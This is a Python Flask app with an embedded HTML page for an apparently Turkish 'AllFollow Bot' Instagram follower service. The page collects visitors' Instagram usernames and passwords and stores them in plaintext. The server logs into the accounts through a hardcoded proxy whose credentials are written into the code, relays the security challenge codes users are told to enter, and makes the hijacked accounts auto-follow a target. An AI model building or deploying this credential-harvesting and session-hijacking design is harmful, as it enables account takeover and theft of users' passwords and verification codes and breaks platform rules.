import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, TwoFactorRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v61-real-bot"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# Aktif clientları hafızada tutuyoruz ki kod gelince onaylayabilelim
clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(50), default="Bekliyor") # OK, KOD_LAZIM, HATA

# --- TAKİP ETME FONKSİYONU (COİN KAZANDIRAN KISIM) ---
def start_auto_follow(cl, username):
    try:
        # Örnek: Kendi hesabını veya popüler birini takip ettirerek başlat
        target_user = "instagram" 
        user_id = cl.user_id_from_username(target_user)
        cl.user_follow(user_id)
        print(f"✅ {username} takip işlemine başladı.")
    except Exception as e:
        print(f"❌ Takip hatası: {e}")

# --- GERÇEK GİRİŞ İŞLEMCİSİ ---
def login_and_follow(u, p):
    with app.app_context():
        cl = Client()
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        clients[u] = cl
        
        try:
            cl.login(u, p)
            acc = IGAccount.query.filter_by(username=u).first()
            acc.status = "OK"
            db.session.commit()
            # Giriş başarılı! Takibi başlat:
            start_auto_follow(cl, u)
        except ChallengeRequired:
            acc = IGAccount.query.filter_by(username=u).first()
            acc.status = "KOD_LAZIM"
            db.session.commit()
        except Exception as e:
            acc = IGAccount.query.filter_by(username=u).first()
            acc.status = f"HATA: {str(e)[:10]}"
            db.session.commit()

# --- API YOLLARI ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="Baglaniyor")
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Baglaniyor"
    db.session.commit()

    threading.Thread(target=login_and_follow, args=(u, p)).start()
    return jsonify(status="process_started")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    if cl:
        try:
            cl.challenge_set_code(code)
            with app.app_context():
                acc = IGAccount.query.filter_by(username=u).first()
                acc.status = "OK"
                db.session.commit()
            start_auto_follow(cl, u)
            return jsonify(status="success")
        except: return jsonify(status="fail")
    return jsonify(status="no_client")

# --- HTML ARAYÜZ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow Bot</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style> .page { display: none; } .active { display: block; } </style>
</head>
<body class="bg-black text-white">

    <div id="login-p" class="page active p-10 mt-20 text-center">
        <h1 class="text-4xl font-black italic mb-10">ALL FOLLOW</h1>
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 rounded-2xl outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 rounded-2xl outline-none">
            <button onclick="baslat()" id="btn" class="w-full p-4 bg-purple-600 rounded-2xl font-bold">BAĞLAN</button>
        </div>
    </div>

    <div id="main-p" class="page bg-white text-black min-h-screen p-6">
        <div class="bg-purple-600 p-6 rounded-3xl text-white text-center mb-6">
            <p class="text-xs opacity-70">BOT DURUMU</p>
            <h2 id="st-text" class="text-xl font-bold italic animate-pulse">BAĞLANILIYOR...</h2>
        </div>

        <div id="v-area" class="hidden bg-red-50 p-6 rounded-3xl border-2 border-red-200 mb-6 text-center">
            <p class="text-red-600 font-bold mb-3">Instagram Onay Kodu İstedi:</p>
            <input id="vcode" placeholder="000000" class="w-full p-4 text-center text-2xl rounded-xl border mb-4">
            <button onclick="onayla()" class="w-full bg-red-600 text-white py-4 rounded-xl font-bold">ONAYLA</button>
        </div>
        
        <p id="usr-id" class="text-center font-bold text-gray-400"></p>
    </div>

    <script>
        let u = "";
        function baslat() {
            u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;
            document.getElementById('btn').innerText = "İŞLENİYOR...";

            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });

            setTimeout(() => {
                document.getElementById('login-p').classList.remove('active');
                document.getElementById('main-p').classList.add('active');
                document.getElementById('usr-id').innerText = "@" + u;
                track();
            }, 800);
        }

        async function track() {
            const res = await fetch('/api/status/' + u);
            const data = await res.json();
            const s = data.status;
            const txt = document.getElementById('st-text');
            const v = document.getElementById('v-area');

            if(s === "OK") {
                txt.innerText = "SİSTEM AKTİF - TAKİP YAPILIYOR ✅";
                txt.classList.remove('animate-pulse');
                v.classList.add('hidden');
            } else if(s === "KOD_LAZIM") {
                txt.innerText = "ONAY BEKLENİYOR ⚠️";
                v.classList.remove('hidden');
                setTimeout(track, 3000);
            } else {
                setTimeout(track, 3000);
            }
        }

        async function onayla() {
            const code = document.getElementById('vcode').value;
            await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, code})
            });
            document.getElementById('vcode').value = "";
        }
    </script>
</body>
</html>
